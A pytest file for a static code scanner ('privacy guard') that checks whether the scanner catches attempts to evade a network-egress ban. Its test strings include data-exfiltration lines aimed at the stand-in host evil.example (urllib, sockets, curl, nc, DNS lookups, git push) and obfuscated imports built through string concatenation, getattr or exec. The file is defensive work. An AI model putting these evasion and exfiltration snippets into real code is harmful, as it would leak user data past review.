"""The static guard against evasion (REVIEW-PRIVACY P1): alias tracking, constant folding, processes, dynamic code, and the agent service.

The first block is the reviewer's own reproducer set (evals/review/privacy/test_p1_guard_bypass.py, copied here, not imported, so this file stands alone): every
one of those snippets passed the old guard silently; each must now be flagged, in an ordinary layer and in a pure-compute layer. The rest are further
evasions, the false-positive controls, and the agent-package scan with its reviewed allow list.
"""
from __future__ import annotations

import ast
import textwrap
from pathlib import Path

import pytest

from understudy_engine.privacy import guard, netscan

LAYER = "calendar/x.py"
PURE = "mlv2/x.py"
AGENT = "understudy_agent/voice/x.py"
RUNTIME = "understudy_agent/runtime/x.py"


def rules_of(src: str, path: str = LAYER) -> set[str]:
    return {v.rule for v in guard.scan_source(textwrap.dedent(src), path)[0]}


# --------------------------------------------------------------------------- the reviewer's evasions: each expected rule
REVIEWER_LAYER = {
    "import_urllib_then_urllib_request": ("import urllib\nurllib.request.urlopen('https://evil.example/x?d=' + data)\n", {"network_import"}),
    "from_urllib_import_request": ("from urllib import request\nrequest.urlopen('https://evil.example/x')\n", {"network_import"}),
    "from_http_import_client": ("from http import client\nc = client.HTTPSConnection('evil.example')\nc.request('POST','/',body=data)\n", {"network_import"}),
    "asyncio_open_connection": ("import asyncio\nasync def f(d):\n    r, w = await asyncio.open_connection('evil.example', 443)\n    w.write(d)\n", {"network_import", "network_call"}),
    "webbrowser_open_leaks_in_url": ("import webbrowser\nwebbrowser.open('https://evil.example/?q=' + data)\n", {"network_import"}),
    "logging_http_handler": ("import logging.handlers\nh = logging.handlers.HTTPHandler('evil.example', '/log', method='POST')\n", {"network_import"}),
    "logging_socket_handler": ("import logging.handlers\nh = logging.handlers.SocketHandler('evil.example', 9999)\n", {"network_import"}),
    "multiprocessing_connection": ("from multiprocessing.connection import Client\nc = Client(('evil.example', 6000))\nc.send(data)\n", {"network_import"}),
    "curl_by_absolute_path": ("import subprocess\nsubprocess.run(['/usr/bin/curl', '-d', data, 'https://evil.example'])\n", {"process_fetcher"}),
    "curl_string_built": ("import subprocess\nsubprocess.run('c' + 'url -d ' + data + ' https://evil.example', shell=True)\n", {"process_fetcher"}),
    "nc_ssh_scp_osascript": ("import subprocess\nsubprocess.run(['nc', 'evil.example', '9'], input=data)\n", {"process_fetcher"}),
    "mac_open_url": ("import subprocess\nsubprocess.run(['open', 'https://evil.example/?d=' + data])\n", {"process_url"}),
    "python_dash_c_child": ("import subprocess, sys\nsubprocess.run([sys.executable, '-c', 'import urllib.request as u; u.urlopen(\"https://evil.example\")'])\n", {"process_url", "network_import"}),
    "git_push_via_subprocess": ("import subprocess\nsubprocess.run(['git', 'push', 'https://evil.example/r.git', 'HEAD'])\n", {"process_git_network", "process_url"}),
    "getattr_on_importlib_variable_name": ("import importlib\nname = 'op' + 'enai'\nm = importlib.import_module(name)\n", {"model_client_import"}),
    "builtin_dunder_import_alias": ("import builtins\nm = getattr(builtins, '__imp' + 'ort__')('httpx')\n", {"network_import"}),
    "exec_string": ("exec('import ' + 'httpx; httpx.post(\"https://evil.example\", content=d)')\n", {"network_import"}),
    "port_in_variable_named_x": ("def f(x):\n    return x.plan([{'role':'user','content':raw}], None)\n", {"model_call"}),
    "port_via_getattr": ("def f(p):\n    return getattr(p, 'plan')([{'role':'user','content':raw}], None)\n", {"model_call"}),
    "ctypes_libc_connect": ("import ctypes\nctypes.CDLL(None).connect\n", {"network_import"}),
    "dns_exfil_gethostbyname": ("import socket as s\ns.gethostbyname(data + '.evil.example')\n", {"network_import", "network_call"}),
}


@pytest.mark.parametrize("name", sorted(REVIEWER_LAYER))
def test_each_reviewer_evasion_is_flagged_in_an_extension_layer(name):
    src, expected = REVIEWER_LAYER[name]
    got = rules_of(src, LAYER)
    assert got, f"{name} is still invisible to the guard"
    assert got & expected, f"{name}: flagged as {got}, expected one of {expected}"


@pytest.mark.parametrize("name", sorted(REVIEWER_LAYER))
def test_each_reviewer_evasion_is_flagged_in_a_pure_compute_layer_too(name):
    assert rules_of(REVIEWER_LAYER[name][0], PURE), f"{name} is invisible in a pure-compute layer"


REVIEWER_AGENT = {
    "httpx_post_to_any_host_outside_runtime": "import httpx\nhttpx.post('https://evil.example/c', content=data)\n",
    "requests_in_agent_voice": "import requests\nrequests.post('https://evil.example', data=data)\n",
    "other_llm_host_not_in_PROVIDER_HOSTS": "import httpx\nhttpx.post('https://api.anthropic.com/v1/messages', json={'messages':[{'content': data}]})\n",
    "other_llm_host_openrouter": "import httpx\nhttpx.post('https://openrouter.ai/api/v1/chat/completions', json={})\n",
    "other_llm_host_via_env": "import os, httpx\nhttpx.post(os.environ['LLM_URL'], json={'p': data})\n",
}


@pytest.mark.parametrize("name", sorted(REVIEWER_AGENT))
def test_each_reviewer_agent_side_evasion_is_flagged(name):
    src = REVIEWER_AGENT[name]
    assert guard.scan_agent_source(src, AGENT)[0], name
    assert guard.provider_endpoint_violations(src, AGENT), name               # the reviewer's entry point sees it too
    assert guard.scan_runtime_source(src, RUNTIME), name                      # and so does the runtime rule


def test_other_hosted_model_hosts_and_sdks_are_named_not_just_gemini_and_openai():
    for host in ("api.anthropic.com", "openrouter.ai", "api.groq.com", "api.mistral.ai", "api.together.xyz"):
        assert guard.provider_endpoint_violations(f"U = 'https://{host}/v1'\n", "understudy_engine/x.py", include_agent_network=False)
    for sdk in ("anthropic", "cohere", "mistralai", "groq", "litellm", "openai"):
        assert guard.provider_endpoint_violations(f"import {sdk}\n", "understudy_engine/x.py", include_agent_network=False)


# --------------------------------------------------------------------------- more evasions (aliases, folding, processes, dynamic code)
EXTRA = [
    ("import urllib.request as u\nu.urlopen('https://x')\n", "network_import"),
    ("from socket import socket as s\ns().connect(('x', 1))\n", "network_import"),
    ("import urllib\nu = urllib.request\nu.urlopen('https://x')\n", "network_import"),
    ("import importlib\nu = importlib.import_module('url' + 'lib.request')\nu.urlopen('https://x')\n", "network_import"),
    ("import importlib\nm = importlib.import_module(''.join(['soc', 'ket']))\n", "network_import"),
    ("m = __import__('soc' + 'ket')\n", "network_import"),
    ("import socket\nc = getattr(socket, 'create_connection')\n", "network_import"),
    ("import importlib\nm = getattr(importlib, 'import_module')('socket')\n", "network_import"),
    ("eval(\"__import__('socket')\")\n", "network_import"),
    ("exec('import ' + 'smtplib')\n", "network_import"),
    ("import os\nos.popen('wget https://x')\n", "process_fetcher"),
    ("import subprocess\nsubprocess.Popen(['/usr/local/bin/scp', 'a', 'h:b'])\n", "process_fetcher"),
    ("import subprocess\nsubprocess.run(['sudo', 'curl', 'x'])\n", "process_fetcher"),
    ("import subprocess\nsubprocess.run(['env', 'FOO=1', 'wget', 'x'])\n", "process_fetcher"),
    ("import subprocess\nsubprocess.run(['/usr/bin/env', 'rsync', 'a', 'b'])\n", "process_fetcher"),
    ("import subprocess\nsubprocess.run('sh -c \"curl x\"', shell=True)\n", "process_fetcher"),
    ("import subprocess\nsubprocess.run(['sh', '-c', 'echo hi && curl x'])\n", "process_fetcher"),
    ("import subprocess\nCURL = 'curl'\nsubprocess.run([CURL, 'x'])\n", "process_fetcher"),
    ("import subprocess\ncmd = ['wget', 'x']\nsubprocess.run(cmd)\n", "process_fetcher"),
    ("import subprocess\nx = 'cu'\nsubprocess.run([x + 'rl', 'u'])\n", "process_fetcher"),
    ("import subprocess\nsubprocess.run(f'curl {data}', shell=True)\n", "process_fetcher"),
    ("import subprocess\nsubprocess.run('curl {}'.format(data), shell=True)\n", "process_fetcher"),
    ("import subprocess\nsubprocess.run(['ssh', 'h', 'ls'])\n", "process_fetcher"),
    ("import subprocess\nsubprocess.run(['osascript', '-e', 'do shell script \"x\"'])\n", "process_fetcher"),
    ("import subprocess\nsubprocess.run(['git', '-C', repo, 'fetch', 'origin'])\n", "process_git_network"),
    ("import subprocess\nsubprocess.run(['git', 'pull'])\n", "process_git_network"),
    ("import subprocess\nsubprocess.run(['git', 'ls-remote', 'origin'])\n", "process_git_network"),
    ("import subprocess\nsubprocess.run(['git', 'clone', 'git@host.example:r.git'])\n", "process_url"),
    ("import subprocess\nsubprocess.run(['scp', 'f', 'user@host.example:/tmp/'])\n", "process_fetcher"),
    ("import asyncio\nasync def f():\n    await asyncio.create_subprocess_exec('curl', 'x')\n", "process_fetcher"),
    ("import asyncio\nasync def f(loop):\n    await loop.create_connection(P, 'h', 80)\n", "network_call"),
    ("from asyncio import open_connection\n", "network_import"),
    ("import asyncio.streams\n", "network_import"),
    ("import http.server\n", "network_import"),
    ("import socketserver\n", "network_import"),
    ("import ssl\n", "network_import"),
    ("import xmlrpc.client\n", "network_import"),
    ("import smtplib\n", "network_import"),
    ("import ftplib\n", "network_import"),
    ("import telnetlib\n", "network_import"),
    ("from logging.handlers import SMTPHandler\n", "network_import"),
    ("import logging.handlers as lh\nlh.DatagramHandler('h', 1)\n", "network_import"),
    ("import multiprocessing.managers\n", "network_import"),
    ("import cffi\n", "network_import"),
    ("import urllib3\n", "network_import"),
    ("import websockets\n", "network_import"),
    ("import paramiko\n", "network_import"),
    ("import uvicorn\nuvicorn.run(app, host='0.0.0.0', port=1)\n", "server_not_loopback"),
    ("import socket\ns = socket.socket()\ns.bind(('0.0.0.0', 1))\n", "server_not_loopback"),
    ("exec(code)\n", "dynamic_code"),
    ("def f(src):\n    eval(src)\n", "dynamic_code"),
    ("import importlib\nm = importlib.import_module(name)\n", "dynamic_import"),
    ("m = __import__(name)\n", "dynamic_import"),
    ("import subprocess\nsubprocess.run(['python3', '-c', 'import socket'])\n", "network_import"),
    ("import subprocess\nsubprocess.run(['/usr/bin/python3.12', '-c', 'import requests'])\n", "network_import"),
    ("from understudy_agent.models import get_model_port\n", "model_client_import"),
    ("import openai\n", "model_client_import"),
    ("from google import genai\n", "model_client_import"),
    ("import google.generativeai\n", "model_client_import"),
    ("def f(p):\n    return p.check('prompt', SCHEMA)\n", "model_call"),
    ("def f(p):\n    return p.read(text, schema=S)\n", "model_call"),
    ("def f(p):\n    return getattr(p, 'vision')(b'', 'x')\n", "model_call"),
    ("def f(t):\n    return t.computer_step('g', b'', [])\n", "model_call"),
]


@pytest.mark.parametrize("src,rule", EXTRA, ids=[f"{i:02d}" for i in range(len(EXTRA))])
def test_further_evasions_are_flagged(src, rule):
    assert rule in rules_of(src, LAYER), f"{src!r}: got {rules_of(src, LAYER)}"


@pytest.mark.parametrize("src", [
    "import json, re, ast, hashlib, math, random, itertools, dataclasses\nfrom datetime import datetime\nfrom pathlib import Path\n",
    "from urllib.parse import urlparse, quote, parse_qs\nu = urlparse('http://x/y')\n",
    "import urllib.parse\nurllib.parse.quote('a b')\n",
    "import asyncio\nasync def f():\n    await asyncio.sleep(1)\n    await asyncio.gather()\n",
    "import subprocess\nsubprocess.run(['git', '-C', repo, 'log', '--format=%H'], capture_output=True)\n",
    "import subprocess\nsubprocess.run(['git', 'init', str(path)])\nsubprocess.run(['git', 'commit', '-m', 'x'])\n",
    "import subprocess\nsubprocess.run(['git', 'clone', '/local/repo', '/tmp/copy'])\n",
    "import subprocess\nsubprocess.run(['caffeinate', '-dis'])\n",
    "import subprocess\nsubprocess.run(['screencapture', '-x', 'f.png'])\n",
    "import subprocess, sys\nsubprocess.run([sys.executable, '-m', 'pytest'])\n",
    "import subprocess, sys\nsubprocess.run([sys.executable, '-c', 'print(1 + 1)'])\n",
    "x = 'curl'\n",                                                                    # a word, in a module that starts no process
    "NAMES = ['ssh', 'host', 'dig']\nfor n in NAMES:\n    print(n)\n",
    "def f(items):\n    return items.read()\n",
    "def f(plan):\n    return plan.check(1)\n",
    "import importlib\nm = importlib.import_module('json')\n",
    "m = __import__('os')\n",
    "exec('x = 1 + 1')\n",
    "import ast\ncompile(ast.parse('x=1'), 'f', 'exec')\n",
    "from dataclasses import dataclass\nimport logging.handlers\nh = logging.handlers.RotatingFileHandler('a.log')\n",
    "import logging.handlers\nh = logging.handlers.QueueHandler(q)\n",
    "import multiprocessing\np = multiprocessing.Pool(2)\n",
    "import uvicorn\nuvicorn.run(app, host='127.0.0.1', port=1)\n",
    "import re\nPAT = re.compile(r'https?://[^ ]+')\n",
])
def test_ordinary_code_is_not_flagged_by_the_hardened_scan(src):
    assert rules_of(src, LAYER) == set(), rules_of(src, LAYER)


def test_a_url_in_a_docstring_or_a_schema_id_is_not_egress_in_an_ordinary_layer():
    assert rules_of('"""See https://example.org/docs."""\nSCHEMA = {"$id": "https://json-schema.org/draft/2020-12/schema"}\n', LAYER) == set()


# --------------------------------------------------------------------------- pure compute: process and url rules, no exceptions
def test_pure_compute_refuses_any_process_and_any_url():
    assert "pure_compute_import" in rules_of("import subprocess\n", PURE)
    assert "pure_compute_url" in rules_of("U = 'https://example.org/data.csv'\n", PURE)
    assert "pure_compute_call" in rules_of("import os\nos.system('ls')\n", PURE)


# --------------------------------------------------------------------------- the agent service scan and its reviewed allow list
def test_the_real_agent_service_is_clean_and_the_provider_package_and_runtime_are_the_only_skips():
    rep = guard.scan_agent()
    assert rep.files and rep.ok, "\n".join(map(str, rep.violations))
    assert not any(f.startswith(guard.AGENT_SKIP) for f in rep.files)
    names = {Path(f).name for f in rep.files}
    for must in ("handoff_io.py", "server.py", "tts.py", "runner.py", "base.py"):
        assert must in names, f"{must} is not under the agent scan"
    assert guard.scan_runtime().files, "the agent runtime is not scanned"


def test_a_new_agent_file_that_uses_the_network_fails_until_it_is_reviewed(tmp_path):
    root = tmp_path / "understudy_agent"
    (root / "voice").mkdir(parents=True)
    (root / "voice" / "new_client.py").write_text("import httpx\nhttpx.post('http://127.0.0.1:7700/x', json={})\n")
    (root / "ok.py").write_text("import json\n")
    rep = guard.scan_agent(root)
    assert rep.violations and {v.rule for v in rep.violations} == {"network_import"} and all(v.file.endswith("voice/new_client.py") for v in rep.violations)
    rep2 = guard.scan_runtime(root / "voice")
    assert any(v.rule == "network_import" for v in rep2.violations)


def test_a_reviewed_agent_file_may_use_only_what_its_entry_names(monkeypatch):
    monkeypatch.setitem(guard.AGENT_ALLOW, "understudy_agent/voice/ok_client.py", netscan.Allow("test entry", frozenset({"httpx"})))
    ok = "import httpx\nBASE = 'http://127.0.0.1:7700'\nhttpx.get(BASE + '/health')\n"
    assert guard.scan_agent_source(ok, "understudy_agent/voice/ok_client.py")[0] == []
    assert "network_import" in {v.rule for v in guard.scan_agent_source("import requests\nBASE='http://127.0.0.1'\n", "understudy_agent/voice/ok_client.py")[0]}
    assert "remote_url" in {v.rule for v in guard.scan_agent_source("import httpx\nhttpx.get('https://evil.example/x')\nB='127.0.0.1'\n", "understudy_agent/voice/ok_client.py")[0]}
    assert "network_import" in {v.rule for v in guard.scan_agent_source("import socket\n", "understudy_agent/voice/ok_client.py")[0]}


def test_a_loopback_client_must_be_demonstrably_loopback(monkeypatch):
    monkeypatch.setitem(guard.AGENT_ALLOW, "understudy_agent/voice/lb.py", netscan.Allow("test entry", frozenset({"httpx"})))
    no_evidence = "import httpx\nimport os\nBASE = os.environ['URL']\nhttpx.get(BASE)\n"
    assert "loopback_not_demonstrated" in {v.rule for v in guard.scan_agent_source(no_evidence, "understudy_agent/voice/lb.py")[0]}
    for evidence in ("BASE = 'http://127.0.0.1:7700'\n", "BASE = 'http://localhost:7700'\n", "H = 'localhost'\n"):
        assert guard.scan_agent_source("import httpx\nimport os\n" + evidence + "httpx.get(BASE if 'BASE' in dir() else H)\n", "understudy_agent/voice/lb.py")[0] == []


def test_a_remote_entry_must_carry_the_one_host_it_names(monkeypatch):
    monkeypatch.setitem(guard.AGENT_ALLOW, "understudy_agent/voice/remote.py", netscan.Allow("test entry", frozenset({"httpx"}), frozenset({"api.example.org"})))
    assert guard.scan_agent_source("import httpx\nU = 'https://api.example.org/v1'\n", "understudy_agent/voice/remote.py")[0] == []
    r = {v.rule for v in guard.scan_agent_source("import httpx\nU = 'https://other.example.org/v1'\nV = 'https://api.example.org'\n", "understudy_agent/voice/remote.py")[0]}
    assert "remote_url" in r
    assert "remote_not_demonstrated" in {v.rule for v in guard.scan_agent_source("import httpx\nU = '127.0.0.1'\n", "understudy_agent/voice/remote.py")[0]}


def test_every_allow_entry_names_a_real_file_and_is_still_needed():
    """A stale entry is a hole waiting for a new use: each reviewed entry must match a file, and removing it must produce a violation."""
    problems = []
    for table, root, rel_root, kind in ((guard.ALLOW, guard.ENGINE_PKG, "", "layer"), (guard.AGENT_ALLOW, guard.AGENT_PKG.parent, "", "agent")):
        for pat, allow in list(table.items()):
            files = sorted(root.glob(pat))
            if not files:
                problems.append(f"{pat}: no such file")
                continue
            for f in files:
                rel = f.relative_to(root).as_posix()
                src = f.read_text(encoding="utf-8")
                with_entry = guard.scan_source(src, rel, kind=kind)[0]
                saved = dict(table)
                table.pop(pat)
                try:
                    without = guard.scan_source(src, rel, kind=kind)[0]
                finally:
                    table.update(saved)
                if with_entry:
                    problems.append(f"{rel}: still violates with its entry: {with_entry[0]}")
                if not without:
                    problems.append(f"{rel}: its entry is not needed (no violation without it): {allow.reason[:50]}")
    assert problems == [], "\n".join(problems)


def _module_constant(path: Path, name: str) -> str | None:
    for node in ast.parse(path.read_text(encoding="utf-8")).body:
        if isinstance(node, ast.Assign) and len(node.targets) == 1 and isinstance(node.targets[0], ast.Name) and node.targets[0].id == name:
            return node.value.value if isinstance(node.value, ast.Constant) else None
    return None


def test_the_loopback_constants_named_in_allow_entries_really_are_loopback_literals():
    checks = {
        "understudy_agent/sandbox_sites/runner.py": [guard.AGENT_PKG / "sandbox_sites" / "specs.py"],
        "understudy_agent/sandbox_roles/base.py": [guard.AGENT_PKG / "sandbox_roles" / "__init__.py"],
        "localmodel/server.py": [guard.ENGINE_PKG / "localmodel" / "config.py"],
    }
    for key, defining in checks.items():
        entry = guard.AGENT_ALLOW.get(key) or guard.ALLOW.get(key)
        assert entry is not None and entry.loopback_names, key
        for name in entry.loopback_names:
            const = name.split(".")[-1]
            assert any(_module_constant(p, const) in netscan.LOOPBACK_HOSTS for p in defining), f"{key}: {name} is not a loopback literal"


def test_the_local_model_client_really_refuses_a_remote_host():
    from understudy_engine.localmodel import client

    assert client.assert_loopback("http://127.0.0.1:8089/") == "http://127.0.0.1:8089"
    for bad in ("http://example.org", "https://api.openai.com/v1", "http://192.168.1.5:8089"):
        with pytest.raises(client.ClientError):
            client.assert_loopback(bad)


# --------------------------------------------------------------------------- pending exceptions are not accepted exceptions
def test_the_voice_exception_is_listed_as_pending_not_silently_accepted():
    pend = {p["file"]: p for p in guard.pending_exceptions()}
    assert "understudy_agent/voice/tts.py" in pend and "outside the egress guard" in pend["understudy_agent/voice/tts.py"]["pending"]
    assert guard.AGENT_ALLOW["understudy_agent/voice/tts.py"].pending


# --------------------------------------------------------------------------- the runtime: no network at all
def test_runtime_children_have_no_network_and_no_reviewed_exception(monkeypatch):
    monkeypatch.setitem(guard.AGENT_ALLOW, "understudy_agent/runtime/x.py", netscan.Allow("a mistaken entry", frozenset({"httpx"})))
    assert "network_import" in {v.rule for v in guard.scan_runtime_source("import httpx\nB='127.0.0.1'\n", "runtime/x.py")}
    assert "process_fetcher" in {v.rule for v in guard.scan_runtime_source("import subprocess\nsubprocess.run(['curl', 'x'])\n", "runtime/x.py")}
    assert guard.scan_runtime_source("import subprocess, sys\nsubprocess.run(['sandbox-exec', '-f', 'p.sb', sys.executable, 'f.py'])\n", "runtime/x.py") == []
    assert guard.scan_runtime_source("from ..models.port import ModelPort\ndef f(p: ModelPort): ...\n", "runtime/x.py") == []     # the port itself is its job


def test_relative_imports_resolve_to_the_real_package_names():
    a = netscan.Analyzer("", "understudy_agent/runtime/x.py", netscan.Policy(kind="runtime", package_root="understudy_agent"), None)
    assert a._abs_module(2, "models") == "understudy_agent.models" and a._abs_module(1, "policy") == "understudy_agent.runtime.policy"
    assert netscan.Analyzer("", "calendar/x.py", netscan.Policy(kind="layer"), None)._abs_module(2, "privacy") == "understudy_engine.privacy"
    # an extension layer importing the agent's model package through a relative path is still caught
    assert "model_client_import" in rules_of("from understudy_agent.models import get_model_port\n", "calendar/x.py")
